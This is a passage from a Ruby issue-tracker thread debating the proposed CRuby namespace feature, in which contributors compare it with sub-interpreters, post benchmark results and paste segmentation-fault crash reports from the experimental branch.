All that said, I would love if CRuby would rewrite or document some of that logic, I find load.c particularly hard to follow and I don't think I'm alone on that.</p></div>
  
  <div id="change-112955"><p>tagomoris (Satoshi Tagomori) wrote in <a href="#note-28">#note-28</a>:</p>
<blockquote>
<p>Mounting server-less applications (run on AWS Lambda, separated on processes in production) on a single app server for development</p>
</blockquote>
<p>Why not simply using different processes for that? CRuby is pretty fast to start (and server-less applications typically rather small). It also matches better what happens in production.<br>
Reading the 2 main purposes at <a href="https://github.com/tagomoris/LFA">https://github.com/tagomoris/LFA</a> it feels pretty niche to me, but I may be missing something.<br>
I totally get the high value of being able to run those server-less applications locally, but why not just one process per server-less application?<br>
What does the Ruby application server gains from being able to access all applications in the same process?</p></div>
  
  <div id="change-112956">
    
    

    <p>Basically, I believe the idea is to have isolated execution contexts without forking, but is hard to achieve that by subclassing Module and tweeking things. Could be wrong, but it is my hunch. As I said, I believe this might need a new entity with new rules.</p>
    </div>
  
  <div id="change-112957"><p>Eregon (Benoit Daloze) wrote in <a href="#note-12">#note-12</a>:</p>
<blockquote>
<p>Unless they truly need to communication at all between namespaces, but then different processes (or multiple interpreters in a process) might be a better trade-off (notably can run in parallel and stronger isolation).</p>
</blockquote>
<p>I made a typo, and edited it on Redmine: to-&gt;no [communication].</p>
<p>tenderlovemaking (Aaron Patterson) wrote in <a href="#note-34">#note-34</a>:</p>
<blockquote>
<p>I don't think it's a good idea to support communication between namespaces.</p>
</blockquote>
<p>I'm not sure, but yeah it seems easy to use incorrectly.</p>
<blockquote>
<p><code>is_a?</code> checks could pass</p>
</blockquote>
<p>It wouldn't, because for <code>obj.is_a?(Foo)</code>, <code>Foo</code> is always different in different namespaces (unless explicitly assigned like <code>ns1::Foo = Foo</code>, and then it's truly the same class in both namespaces).</p>
<p>If there is no communication between namespaces then I don't see the value of namespaces, different processes or sub-interpreters (multiple interpreters in a process) seems a much better trade-off:</p>
<ul>
<li>the semantics are much simpler and better understood: "process-like isolation, nothing shared"</li>
<li>no overhead on Ruby execution</li>
<li>much simpler implementation</li>
</ul>
<p>As a note it's also possible to have some form of communication for sub-interpreters.<br>
That can be restricted to just primitive types (e.g. numbers and strings) or some core types to make it simpler/safer.</p></div>
  
  
  
  
  
  
  
  
  
  
  
  <div id="change-112974"><p>fxn (Xavier Noria) wrote in <a href="#note-44">#note-44</a>:</p>
<blockquote>
<p>Congrats <a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> :).</p>
<p>Would you be open to consider having the permanent name of classes and modules be constant paths?</p>
</blockquote>
<p>Thank you :D</p>
<p>I'm totally open to consider changing the current behavior around permanent classpath including namespace.<br>
But I'll focus on fixing some minor issues then merging the branch into master as it is.<br>
@fxn Could you open another independent ticket about it instead of continuing the discussion here?</p></div>
  
  
  
  <div id="change-112981"><p>I think it would be good to compare this to "isolated execution contexts" which is the well-known approach to get such isolation, e.g.:</p>
<ul>
<li>CPython has sub-interpreters</li>
<li>V8 (JavaScript) has isolates</li>
<li>MRuby has mrb_state/mrb_open() (basically sub-interpreters)</li>
<li>TruffleRuby and JRuby have sub-interpreters</li>
<li>Scripting languages on the JVM have ScriptEngine/ScriptContext and GraalVM has Context</li>
<li>Many use-cases which want to embed some other language often need such "isolated execution contexts"</li>
</ul>
<p>They are all the same concept and well established.<br>
I'll call this concept "sub-interpreters" for brevity.</p>
<p>Namespace on read is quite different and is not the same concept.<br>
Here is a list of trade-offs I can think of:</p>
<ul>
<li>Namespace on read has no guarantee for isolation, so it is not possible to achieve some use cases which work fine with sub-interpreters</li>
<li>Namespace on read loads everything in the same GC heap (cannot avoid it due to cross-namespace references). So with more apps it becomes slower. OTOH each sub-interpreter/isolate can have its own heap and GC.</li>
<li>Namespace on read has complicated semantics, notably core classes are both shared (whatever was in the root namespace) and not shared (whatever is set/defined after). Sub-interpreter have the classical process-like isolation semantics.</li>
<li>Implementation-wise, namespace is more complicated as there is subtle sharing going on CoW of core classes.</li>
<li>Performance-wise, namespace has more overhead as explained in <a href="https://bugs.ruby-lang.org/issues/21311#note-15">https://bugs.ruby-lang.org/issues/21311#note-15</a>
</li>
<li>Sub-interpreters run in parallel. Namespaces do not. This is probably the biggest drawback. Ractor may help but Ractor is also incompatible with most gems/code and has lots of contention so doesn't scale linearly.</li>
</ul>
<p>Implementing sub-interpreters is of course non-trivial work, but I would think not harder than implementing namespaces.</p>
<p>There is also an easy approximation of sub-interpreters: create N processes (or fork just after loading with <code>--disable-gems</code>) and use each process as a "sub-interpreter".<br>
That runs in parallel, has separate heaps so parallel GC too and has the best isolation.<br>
I don't think namespaces can beat that, except for the convenience of communication, but that can be done via pipes, sockets, etc.</p>
<p>IOW, sub-interpreters are similar to Namespace + Ractor but with proper isolation, full compatibility, linear scaling and clear semantics.</p></div>
  
  <div id="change-113055"><p>In <a href="https://github.com/ruby/dev-meeting-log/blob/master/2025/DevMeeting-2025-05-08.md#discussion">https://github.com/ruby/dev-meeting-log/blob/master/2025/DevMeeting-2025-05-08.md#discussion</a></p>
<blockquote>
<p>mame: Are there any strong opponents?</p>
</blockquote>
<p>I guess I am one.<br>
There are many concerns from several people that have been raised here, many unanswered.<br>
I think they should be answered before merging the PR.</p>
<p>It seems clear the performance should be checked before merging the PR, especially since the feature is not behind <code>#ifdef</code>.</p>
<p>There also doesn't seem to be a convincing use case that can't be done with just multiple processes.<br>
At least that should be clearly shown, adding such complexity without a good use case seems a bad idea.</p>
<p>And the first paragraph <a href="https://bugs.ruby-lang.org/issues/21311#note-36">https://bugs.ruby-lang.org/issues/21311#note-36</a> seems a clear bug.</p>
<p>In my opinion, to keep it short: we could have sub-interpreters (known to work well and have many advantages) or 2 half-working features like Namespace + Ractor (Ractor is incompatible with most gems, I don't think it's solvable, hence "half-working").<br>
There are similarities between sub-interpreters and Namespace, e.g., it would be the same logic to copy C extensions to isolate them.<br>
IOW, I think it would be far better to introduce sub-interpreters in CRuby than Namespace.</p>
<p>I understand wanting to merge soon to avoid conflicts but also there hasn't been a proper discussion on the advantages of Namespace vs sub-interpreters (which could have started long before the implementation was near-complete).<br>
Given that TruffleRuby and JRuby and many other VMs have sub-interpreters, I think it's crucial to figure out if it's worth doing something different like Namespace (which can't run in parallel, has weaker isolation, has more overhead, etc, so seems worse in most aspects).</p>
<p>My concern is Namespace is going to be "another Ractor", i.e., basically a feature which is half though-out and doesn't actually work in practice for non-trivial cases.<br>
Both might end up being CRuby-only features because no-GVL and sub-interpreters (which provides parallelism and full compatibility without removing the GVL BTW) are better alternatives.</p></div>
  
  <div id="change-113056"><p>I am aligned with <a href="https://bugs.ruby-lang.org/users/772">@Eregon (Benoit Daloze)</a>.</p>
<p>There are several important issues.</p>
<p>Another one that has not been mentioned (I think) is that the design trivially allows for two objects with the same object ID to be different entities. The Ruby programmer does not care about <code>VALUE</code> versus some internal C stuff we move around, if two objects have the same ID, they are the same object. But that is no longer the case.</p>
<p>Or, in a non-main user namespace, top-level constants do not belong to (the namespaced) <code>Object</code>. So, being evaluated within a namespace is, again, not transparent. Your code may work differently, while the goal is that it works as-is.</p>
<p>Obviously, there is a lot of work in this patch and I praise the effort to do this work. But, honestly, to me, it is at least premature to merge the patch with all these fundamental things open.</p>
<p>It is cool to make something experimental, but at least it has to be sound, in my view.</p></div>
  
  <div id="change-113057"><p>Let me add.</p>
<p>This is not a case of "let's merge and polish". Problem is, it has to be seen if you can satisfy the goals with this approach at all. Because, you cannot be dazzled by the stated goals, you have to carefully check if the goals are actually satisfied by the solution.</p>
<p>And, personally, as I have said, I am skeptical that is achievable without introducing a fundamentally new concept in the language. (Happy to be proved wrong, though.)</p></div>
  
  <div id="change-113060"><p>This feature proposal is quite exceptional. Because this is a feature strongly driven by <a href="https://bugs.ruby-lang.org/users/13">@matz (Yukihiro Matsumoto)</a> himself, and Ruby is matz's language.</p>
<p><a href="https://bugs.ruby-lang.org/users/1855">@tagomoris (Satoshi Tagomori)</a> has been working closely with Matz for several years to design and implement it. Although there are still many incomplete or rough parts, the decision has already been made.</p>
<p>This feature will be soon merged with high priority. In fact, Matz even approved temporarily disabling some CI tests if necessary in order to proceed with the merge. (<a href="https://bugs.ruby-lang.org/users/17">@ko1 (Koichi Sasada)</a> is working hard right now to prevent that from happening.) Anyway, merging it takes precedence over discussion.</p>
<p>I am personally excited to see Ruby adding a bold new feature that brings real energy and discussion to the community. This is Ruby. Let's enjoy this moment and move forward together with excitement.</p></div>
  
  <div id="change-113082"><p>On my laptop, building fiddle fails and it prevents running <code>make yjit-bench</code>.</p>
<p>So I ran benchmark/app_fib.rb and got results (The result after several times continuous runs):</p>
<pre><code># Ruby 3.4.2
$ time ruby benchmark/app_fib.rb 

real	0m0.368s
user	0m0.296s
sys	0m0.019s
$ ruby -v
ruby 3.4.2 (2025-02-15 revision d2930f8e7a) +PRISM [arm64-darwin24]

# 3.5.0dev master HEAD
$ time build/exe/ruby benchmark/app_fib.rb 

real	0m0.301s
user	0m0.282s
sys	0m0.015s
$ build/exe/ruby -v
ruby 3.5.0dev (2025-05-10T06:59:40Z master 3c37d6ffcf) +PRISM [arm64-darwin24]

# 3.5.0dev namespace branch
$ time build/exe/ruby benchmark/app_fib.rb 

real	0m0.315s
user	0m0.294s
sys	0m0.018s
$ build/exe/ruby -v
ruby 3.5.0dev (2025-05-10T07:50:29Z namespace-on-read-.. bd4f57f96b) +PRISM [arm64-darwin24]
</code></pre>
<p>I haven't rebased on the current master HEAD yet, so it may be the reason of the diff between 0.294s and 0.282s.</p>
<p>And the result with <code>RUBY_NAMESPACE=1</code>:</p>
<pre><code>$ time RUBY_NAMESPACE=1 build/exe/ruby benchmark/app_fib.rb 
build/exe/ruby: warning: Namespace is experimental, and the behavior may change in the future!
See doc/namespace.md for know issues, etc.

real	0m0.302s
user	0m0.286s
sys	0m0.013s
</code></pre>
<p>I can't understand why it's quicker than the one without namespace...<br>
(ISeq inline cache works well even with namespace, so it's not surprising to me if the result with RUBY_NAMESPACE=1 is not slower than without.)</p></div>
  
  <div id="change-113086"><blockquote>
<p>So I ran benchmark/app_fib.rb</p>
</blockquote>
<p>Fibonnaci isn't a very interesting benchmark here. It's just the same method being called over and over.</p>
<p><code>yjit-bench</code> contains some macro benchmark that are more likely to have inline cache misses hence will have to go through the extra layers of indirections introduced by the patch.</p></div>
  
  <div id="change-113088"><blockquote>
<p>building fiddle fails</p>
</blockquote>
<p>Could you share the error message?</p></div>
  
  <div id="change-113109"><p><a href="https://bugs.ruby-lang.org/users/18">@mame (Yusuke Endoh)</a></p>
<blockquote>
<p>I am personally excited to see Ruby adding a bold new feature that brings real energy and discussion to the community. This is Ruby. Let's enjoy this moment and move forward together with excitement.</p>
</blockquote>
<p>Absolutely.</p>
<p>I would have waited a little bit more to pass a minimal of community scrutiny before merging as experimental. Which is what is happening against the clock in the bug tracker right now. Some of us are experienced in this corner of the language and can detect inconsistencies just by reading the spec or writing couple of scripts. Others have performance and complexity trade-offs in their radar. Others may see the implications in internal caches, etc.</p>
<p>Open Source, sharing and discussing.</p>
<p>The feature itself is cool on paper. I want to stress that I am not against the feature, and that I absolutely respect the merge and any decisions <a href="https://bugs.ruby-lang.org/users/13">@matz (Yukihiro Matsumoto)</a> does, as it could not be otherwise.</p>
<p>I am a mathematician by training. If presented with something, I'll try to look for the holes and inconsistencies. And that is my way to contribute to this. Please do not take my QA as something against the feature or personal ❤️.</p></div>
  
  <div id="change-113111"><p>kou (Kouhei Sutou) wrote in <a href="#note-54">#note-54</a>:</p>
<blockquote>
<blockquote>
<p>building fiddle fails</p>
</blockquote>
<p>Could you share the error message?</p>
</blockquote>
<p>I couldn't find the log when fiddle is built during <code>make yjit-bench</code>...<br>
Anyway, I'll retry yjit-bench on Linux.</p></div>
  
  <div id="change-113113"><p><code>make yjit-bench</code> is now failing even on master HEAD.</p>
<blockquote>
<p>bin/rails aborted!<br>
LoadError: cannot load such file -- cgi/cookie (LoadError)</p>
</blockquote>
<p>I saw commits to re-organize cgi.<br>
Hmm, I can wait for the fix and will make benchmark outputs if others don't make changes which conflict with the namespace change.<br>
Otherwise, I hope merging the change immediately and will check the performance degradation later.</p></div>
  
  <div id="change-113117"><blockquote>
<p>bin/rails aborted!<br>
LoadError: cannot load such file -- cgi/cookie (LoadError)</p>
</blockquote>
<p>Yes, the <code>cgi</code> changes broke Rails. You can add <code>gem "cgi"</code> to the benchmark's Gemfile to workaround that.</p>
<p>Both Rails nightly CI and Shopify nightly CI are still broken from the recent Set change and got broken more from the CGI change. It has been weeks we haven't seen ruby-head pass, and are still trying to play catch up.</p></div>
  
  
  
  <div id="change-113119"><p>Trying to run benchmarks with <code>RUBY_NAMESPACE=1</code> crashes during init:</p>
<pre><code>opt/rubies/head-namespaces/bin/ruby: [BUG] Segmentation fault at 0x0000000000000008
ruby 3.5.0dev (2025-05-11T00:30:16Z namespace-on-read-.. 6629795fff) +PRISM [arm64-darwin24]

-- Crash Report log information --------------------------------------------
   See Crash Report log file in one of the following locations:             
     * ~/Library/Logs/DiagnosticReports                                     
     * /Library/Logs/DiagnosticReports                                      
   for more details.                                                        
Don't forget to include the above Crash Report log file in bug reports.     

-- Control frame information -----------------------------------------------
c:0001 p:0000 s:0003 E:000380 DUMMY  [FINISH]


-- Threading information ---------------------------------------------------
Total ractor count: 1
Ruby thread count for this ractor: 1

-- Machine register context ------------------------------------------------
  x0: 0x0000000000000000  x1: 0x0000000000000f9f  x2: 0x000000016b156668
  x3: 0x0000000000000000  x4: 0x0000000000000005  x5: 0x00000000de600168
  x6: 0x0000000000002ce0  x7: 0x0000000000000001 x18: 0x0000000000000000
 x19: 0x0000000120026a40 x20: 0x0000000000000000 x21: 0x0000000000000f9f
 x22: 0x00000001051be000 x23: 0x00000001051c3668 x24: 0x0000000142e05900
 x25: 0x0000000000000008 x26: 0x00000001051c3638 x27: 0x000000016b1574c0
 x28: 0x0000000000000009  lr: 0x0000000104d7d420  fp: 0x000000016b156650
  sp: 0x000000016b1565f0

-- C level backtrace information -------------------------------------------
/opt/rubies/head-namespaces/bin/ruby(rb_vm_bugreport+0xb6c) [0x104f315f8]
/opt/rubies/head-namespaces/bin/ruby(rb_bug_for_fatal_signal+0x100) [0x104d5efd4]
/opt/rubies/head-namespaces/bin/ruby(sigsegv+0x84) [0x104e897e8]
/usr/lib/system/libsystem_platform.dylib(_sigtramp+0x38) [0x18de56de4]
/opt/rubies/head-namespaces/bin/ruby(object_id+0x80) [0x104d7d420]
/opt/rubies/head-namespaces/bin/ruby(object_id+0x80) [0x104d7d420]
/opt/rubies/head-namespaces/bin/ruby(rb_initialize_main_namespace+0xe4) [0x104ddaa20]
/opt/rubies/head-namespaces/bin/ruby(ruby_opt_init+0x120) [0x104e7f524]
/opt/rubies/head-namespaces/bin/ruby(ruby_process_options+0x1370) [0x104e7e31c]
/opt/rubies/head-namespaces/bin/ruby(ruby_options+0xb0) [0x104d69844]
/opt/rubies/head-namespaces/bin/ruby(main+0x64) [0x104ca8d54]
</code></pre></div>
  
  <div id="change-113120"><p>headline benchmarks (in non-ideal conditions, I was on battery, etc) and <strong>whithout</strong> <code>RUBY_NAMESPACE=1</code>:</p>
<pre><code>
master: ruby 3.5.0dev (2025-05-11T03:09:26Z master 49742414f6) +PRISM [arm64-darwin24]
namespace: ruby 3.5.0dev (2025-05-11T00:30:16Z namespace-on-read-.. 6629795fff) +PRISM [arm64-darwin24]

--------------  -----------  ----------  --------------  ----------  -----------------  ----------------
bench           master (ms)  stddev (%)  namespace (ms)  stddev (%)  namespace 1st itr  master/namespace
activerecord    148.5        1.2         152.0           3.6         0.986              0.977           
chunky-png      427.8        1.1         424.6           0.3         1.027              1.007           
erubi-rails     625.6        1.7         659.8           1.4         0.997              0.948           
hexapdf         1112.4       1.3         1126.5          0.9         0.943              0.988           
liquid-c        25.9         1.8         27.0            2.0         0.767              0.960           
liquid-compile  25.8         2.4         25.9            2.3         1.000              0.997           
liquid-render   67.8         1.4         71.9            1.5         0.961              0.944           
lobsters        444.4        1.3         446.7           1.4         1.004              0.995           
mail            75.6         13.2        70.7            5.7         0.947              1.068           
psych-load      1095.8       0.5         1093.4          0.2         1.028              1.002           
railsbench      984.1        1.9         1029.9          2.7         0.970              0.956           
rubocop         80.0         2.1         81.8            2.5         0.932              0.977           
ruby-lsp        85.9         0.8         88.0            1.0         0.960              0.976           
sequel          27.6         2.7         27.7            1.1         0.992              0.997           
--------------  -----------  ----------  --------------  ----------  -----------------  ----------------
Legend:
- namespace 1st itr: ratio of master/namespace time for the first benchmarking iteration.
- master/namespace: ratio of master/namespace time. Higher is better for namespace. Above 1 represents a speedup.
</code></pre>
<p>The overhead on the interpreter seem to be about 3-5%. I'll try to fix the branch to get <code>RUBY_NAMESPACE=1</code> not to crash and run the benchmarks again in a better environment.</p></div>
  
  <div id="change-113121"><p>I submitted a fix for the crash here: <a href="https://github.com/tagomoris/ruby/pull/5">https://github.com/tagomoris/ruby/pull/5</a></p>
<p>But now it's crashing in <code>require</code></p>
<pre><code>/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:61: [BUG] Segmentation fault at 0x0000000000000339
ruby 3.5.0dev (2025-05-11T00:30:16Z namespace-on-read-.. 6629795fff) +PRISM [arm64-darwin24]

-- Crash Report log information --------------------------------------------
   See Crash Report log file in one of the following locations:             
     * ~/Library/Logs/DiagnosticReports                                     
     * /Library/Logs/DiagnosticReports                                      
   for more details.                                                        
Don't forget to include the above Crash Report log file in bug reports.     

-- Control frame information -----------------------------------------------
c:0030 p:0017 s:0140 e:000136 METHOD /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:61
c:0029 p:0005 s:0132 e:000131 BLOCK  /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:51 [FINISH]
c:0028 p:---- s:0128 e:000127 CFUNC  :map
c:0027 p:0025 s:0124 e:000122 METHOD /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:51
c:0026 p:0007 s:0118 e:000117 METHOD /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:209
c:0025 p:0492 s:0113 e:000112 BLOCK  /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:70
c:0024 p:0017 s:0109 e:000108 METHOD /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:267
c:0023 p:0007 s:0104 e:000103 CLASS  /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:12
c:0022 p:0013 s:0101 e:000100 TOP    /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:11 [FINISH]
c:0021 p:---- s:0098 e:000097 CFUNC  :require
c:0020 p:0023 s:0093 e:000092 METHOD &lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136 [FINISH]
c:0019 p:---- s:0087 e:000086 CFUNC  :require
c:0018 p:0005 s:0082 e:000081 TOP    /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/methods.rb:3 [FINISH]
c:0017 p:---- s:0079 e:000078 CFUNC  :require
c:0016 p:0023 s:0074 e:000073 METHOD &lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136 [FINISH]
c:0015 p:---- s:0068 e:000067 CFUNC  :require
c:0014 p:0005 s:0063 e:000062 TOP    /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/dependencies/autoload.rb:3 [FINISH]
c:0013 p:---- s:0060 e:000059 CFUNC  :require
c:0012 p:0023 s:0055 e:000054 METHOD &lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136 [FINISH]
c:0011 p:---- s:0049 e:000048 CFUNC  :require
c:0010 p:0011 s:0044 e:000043 TOP    /Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support.rb:27 [FINISH]
c:0009 p:---- s:0041 e:000040 CFUNC  :require
c:0008 p:0023 s:0036 e:000035 METHOD &lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136 [FINISH]
c:0007 p:---- s:0030 e:000029 CFUNC  :require
c:0006 p:0005 s:0025 e:000024 TOP    /Users/byroot/.gem/rubies/head-namespaces/gems/activerecord-7.2.2.1/lib/active_record.rb:26 [FINISH]
c:0005 p:---- s:0022 e:000021 CFUNC  :require
c:0004 p:0023 s:0017 e:000016 METHOD &lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136 [FINISH]
c:0003 p:---- s:0011 e:000010 CFUNC  :require
c:0002 p:0023 s:0006 e:000005 EVAL   benchmark.rb:6 [FINISH]
c:0001 p:0000 s:0003 E:000d50 DUMMY  [FINISH]

-- Ruby level backtrace information ----------------------------------------
benchmark.rb:6:in '&lt;main&gt;'
benchmark.rb:6:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
/Users/byroot/.gem/rubies/head-namespaces/gems/activerecord-7.2.2.1/lib/active_record.rb:26:in '&lt;top (required)&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activerecord-7.2.2.1/lib/active_record.rb:26:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support.rb:27:in '&lt;top (required)&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support.rb:27:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/dependencies/autoload.rb:3:in '&lt;top (required)&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/dependencies/autoload.rb:3:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/methods.rb:3:in '&lt;top (required)&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/methods.rb:3:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
&lt;internal:/opt/rubies/head-namespaces/lib/ruby/3.5.0+0/rubygems/core_ext/kernel_require.rb&gt;:136:in 'require'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:11:in '&lt;top (required)&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:12:in '&lt;module:ActiveSupport&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:267:in 'inflections'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflections.rb:70:in 'block in &lt;module:ActiveSupport&gt;'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:209:in 'uncountable'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:51:in 'add'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:51:in 'map'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:51:in 'block in add'
/Users/byroot/.gem/rubies/head-namespaces/gems/activesupport-7.2.2.1/lib/active_support/inflector/inflections.rb:61:in 'to_regex'

-- Threading information ---------------------------------------------------
Total ractor count: 1
Ruby thread count for this ractor: 1

-- Machine register context ------------------------------------------------
  x0: 0x0000000000000331  x1: 0x0000000000000000  x2: 0x0000000000000f9f
  x3: 0x000000016b4544b8  x4: 0x000000016b454664  x5: 0x0000000000000000
  x6: 0x0000000000000001  x7: 0x0000000000000028 x18: 0x0000000000000000
 x19: 0x0000000000000331 x20: 0x000000015600fc00 x21: 0x000000011e59eec0
 x22: 0x0000000000000000 x23: 0x0000000000000f9f x24: 0x000060000098f660
 x25: 0x0000000000000001 x26: 0x000000016b454448 x27: 0x0000000000000001
 x28: 0x00000001049d16dc  lr: 0x00000001049d16fc  fp: 0x000000016b454390
  sp: 0x000000016b454340

-- C level backtrace information -------------------------------------------
/opt/rubies/head-namespaces/bin/ruby(rb_vm_bugreport+0xb6c) [0x104c2d5f8]
/opt/rubies/head-namespaces/bin/ruby(rb_bug_for_fatal_signal+0x100) [0x104a5af40]
/opt/rubies/head-namespaces/bin/ruby(sigsegv+0x84) [0x104b857e8]
/usr/lib/system/libsystem_platform.dylib(_sigtramp+0x38) [0x18de56de4]
/opt/rubies/head-namespaces/bin/ruby(class_classext_foreach_i+0x20) [0x1049d16fc]
/opt/rubies/head-namespaces/bin/ruby(class_classext_foreach_i+0x20) [0x1049d16fc]
/opt/rubies/head-namespaces/bin/ruby(rb_st_foreach+0xa4) [0x104b8d0c0]
/opt/rubies/head-namespaces/bin/ruby(rb_class_classext_foreach+0x4c) [0x1049d1698]
/opt/rubies/head-namespaces/bin/ruby(rb_gc_mark_children+0x1bc) [0x104a7ad90]
/opt/rubies/head-namespaces/bin/ruby(gc_mark_stacked_objects_incremental+0xac) [0x104a84710]
/opt/rubies/head-namespaces/bin/ruby(gc_continue+0xd0) [0x104a82b88]
/opt/rubies/head-namespaces/bin/ruby(newobj_cache_miss+0x180) [0x104a827b0]
/opt/rubies/head-namespaces/bin/ruby(newobj_of+0x170) [0x104a77548]
/opt/rubies/head-namespaces/bin/ruby(str_duplicate+0xb4) [0x104b9d924]
/opt/rubies/head-namespaces/bin/ruby(rb_reg_initialize_str+0xc4) [0x104b4d994]
/opt/rubies/head-namespaces/bin/ruby(rb_reg_new_ary+0x1e8) [0x104b4dc1c]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x5df4) [0x104c05b90]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(invoke_block_from_c_bh+0x368) [0x104c27274]
/opt/rubies/head-namespaces/bin/ruby(rb_yield+0xa8) [0x104c0e2fc]
/opt/rubies/head-namespaces/bin/ruby(rb_ary_collect+0xd4) [0x1049adeb4]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x1d60) [0x104c01afc]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(load_iseq_eval+0x280) [0x104acb488]
/opt/rubies/head-namespaces/bin/ruby(require_internal+0x99c) [0x104ac90ac]
/opt/rubies/head-namespaces/bin/ruby(rb_require_string_internal+0x58) [0x104ac8320]
/opt/rubies/head-namespaces/bin/ruby(rb_f_require+0x44) [0x104ac81f0]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_call_alias+0x70) [0x104c19b38]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(vm_call0_body+0x470) [0x104c2482c]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_call_kw+0xd8) [0x104c0c660]
/opt/rubies/head-namespaces/bin/ruby(rb_call_super_kw+0x1bc) [0x104c0cbf0]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
/opt/rubies/head-namespaces/bin/ruby(rb_namespace_user_loading_func+0x80) [0x104ad7b0c]
/opt/rubies/head-namespaces/bin/ruby(vm_call_cfunc_with_frame_+0xf0) [0x104c1e8cc]
/opt/rubies/head-namespaces/bin/ruby(vm_exec_core+0x2228) [0x104c01fc4]
/opt/rubies/head-namespaces/bin/ruby(rb_vm_exec+0x184) [0x104bfe838]
/opt/rubies/head-namespaces/bin/ruby(rb_ensure+0xb8) [0x104a66ee4]
